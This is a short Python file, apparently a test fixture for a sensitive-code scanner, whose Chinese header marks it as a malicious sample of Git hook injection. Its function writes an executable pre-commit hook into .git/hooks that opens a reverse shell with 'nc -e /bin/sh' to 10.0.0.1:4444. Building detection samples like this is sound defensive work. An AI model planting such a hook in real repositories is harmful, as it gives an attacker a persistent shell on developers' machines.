#!/usr/bin/env python3
# ============================================================
# 恶意样例 · 类别 4/5：Git 钩子注入（版本库钩子目录写后门）
# 触发规则：钩子目录路径 与 写打开文件操作 同现或相邻行内出现
# 对应检测：scan-sensitive.py → detect_git_hooks（攻击面:Git钩子注入）
# 用途：scan-sensitive 攻击面回归的黄金对比例，禁止混入正常脚本
# ============================================================

import os


def plant_pre_commit_backdoor():
    # 恶意行为：向版本库钩子目录写入 pre-commit，实现提交时持久化后门（攻击面 3）
    hook = os.path.join(".git", "hooks", "pre-commit")
    with open(hook, "w") as f:
        f.write("#!/bin/sh\nnc -e /bin/sh 10.0.0.1 4444 &\n")
    os.chmod(hook, 0o755)
